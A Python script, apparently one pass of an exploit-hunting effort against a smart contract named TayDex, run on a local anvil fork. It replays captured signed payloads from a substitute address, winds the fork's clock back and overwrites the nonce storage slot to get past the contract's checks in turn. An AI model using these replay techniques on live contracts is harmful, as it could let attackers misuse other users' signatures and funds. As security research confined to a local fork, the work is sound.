#!/usr/bin/env python3
"""TayDex pass22: correct the Error(string) decode and drive the replay past the date check.

pass21 bug: I read the ABI OFFSET word as the length -> garbage text. Layout is
  0x08c379a0 | offset(0x20) | length | data           so length is at [74:138], data at [138:].
Also: the payloads are weeks old, so a timestamp check ("endDate past") likely fires BEFORE the
signature check, hiding it. So wind the fork clock back to just before each payload's endDate and
replay again -- that walks the call deeper down the check order.

Read-only apart from anvil_setTime / anvil_setStorageAt, which are LOCAL fork mutations.
"""
import json, os, time, urllib.error, urllib.request

R = "http://127.0.0.1:8546"
C = "0x3ade22fa1ef5ac75437a3734d91ba588e54875dd"
TGT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "taydex")
from Crypto.Hash import keccak as _k
def keccak(b): h = _k.new(digest_bits=256); h.update(b); return h.digest()
def sig4(s): return keccak(s.encode()).hex()[:8]

def rpc(m, p, tries=3):
    for t in range(tries):
        try:
            req = urllib.request.Request(R, data=json.dumps({"jsonrpc": "2.0", "id": 1,
                                                            "method": m, "params": p}).encode(),
                                         headers={"Content-Type": "application/json"})
            return json.loads(urllib.request.urlopen(req, timeout=60).read())
        except urllib.error.HTTPError as e:
            try:    return json.loads(e.read())
            except Exception: pass
        except Exception:
            pass
        time.sleep(1.2)
    return {}

def decode_error(r):
    """Correct Error(string) decoding."""
    if not isinstance(r, dict) or "error" not in r:
        return "SUCCESS -> " + str((r or {}).get("result"))[:70]
    err = r["error"]
    if not isinstance(err, dict):
        return f"TRANSPORT: {str(err)[:120]}"
    d = err.get("data"); msg = err.get("message", "")
    if isinstance(d, str) and d.startswith("0x08c379a0") and len(d) >= 138:
        ln = int(d[74:138], 16)                    # <-- length word, not the offset
        try:
            return f'Error("{bytes.fromhex(d[138:138+ln*2]).decode("utf-8","replace")}")'
        except Exception:
            return f"Error(<undecodable len={ln}>)"
    if isinstance(d, str) and len(d) >= 10:
        return f"{msg} [custom 0x{d[2:10]}]"
    if d is None:
        return f"{msg} (EMPTY data)"
    return str(msg)

def nonces_of(addr):
    r = rpc("eth_call", [{"to": C, "data": "0x" + sig4("nonces(address)")
                          + addr.lower().replace("0x", "").rjust(64, "0")}, "latest"]).get("result")
    return int(r, 16) if isinstance(r, str) else None

def set_time(ts):
    for method, params in [("anvil_setTime", [ts]), ("evm_setTime", [ts]),
                           ("evm_setNextBlockTimestamp", [ts])]:
        r = rpc(method, params)
        if "error" not in r:
            return method
    return None

def now():
    return int(rpc("eth_getBlockByNumber", ["latest", False]).get("result", {}).get("timestamp", "0x0"), 16)

picks = json.load(open(os.path.join(TGT, "pass20_createmarket_decoded.json")))
FRESH = "0x00000000000000000000000000000000cafe0001"
SLOT = 14
print(f"fork now = {now()}  ({time.strftime('%Y-%m-%d %H:%M', time.gmtime(now()))})\n")

# pick the 3 lowest-nonce payloads (most likely usable by a fresh address)
targets = sorted(picks, key=lambda x: x["nonce"])[:3]
print("=" * 100)
print("STEP 1 — replay as-is (current clock), correctly decoded")
print("=" * 100)
for p in targets:
    print(f"\n  payload {p['hash'][:24]}…  nonce={p['nonce']}  endDate={p['endDate']} "
          f"({time.strftime('%Y-%m-%d', time.gmtime(p['endDate']))})  bps={p['feeBps']}")
    for label, who in [("original", p["from"]), ("FRESH", FRESH)]:
        r = rpc("eth_call", [{"from": who, "to": C, "data": p["input"]}, "latest"])
        print(f"    [{label:<9}] nonces={nonces_of(who)}  -> {decode_error(r)}")

print("\n" + "=" * 100)
print("STEP 2 — wind the fork clock back BEFORE each payload's endDate, replay again")
print("=" * 100)
for p in targets:
    t = p["endDate"] - 3600
    used = set_time(t)
    print(f"\n  payload {p['hash'][:24]}…  endDate={time.strftime('%Y-%m-%d %H:%M', time.gmtime(p['endDate']))}")
    print(f"    clock set via {used} -> now={now()} "
          f"({time.strftime('%Y-%m-%d %H:%M', time.gmtime(now()))})")
    for label, who in [("original", p["from"]), ("FRESH", FRESH)]:
        r = rpc("eth_call", [{"from": who, "to": C, "data": p["input"]}, "latest"])
        print(f"    [{label:<9}] nonces={nonces_of(who)}  -> {decode_error(r)}")
    # force the fresh caller's nonce to the payload's nonce and try once more
    key = "0x" + keccak(bytes.fromhex(FRESH.lower().replace("0x", "").rjust(64, "0"))
                        + SLOT.to_bytes(32, "big")).hex()
    rpc("anvil_setStorageAt", [C, key, "0x" + f"{p['nonce']:064x}"])
    r = rpc("eth_call", [{"from": FRESH, "to": C, "data": p["input"]}, "latest"])
    print(f"    [FRESH+nonce={p['nonce']}] nonces={nonces_of(FRESH)} -> {decode_error(r)}")
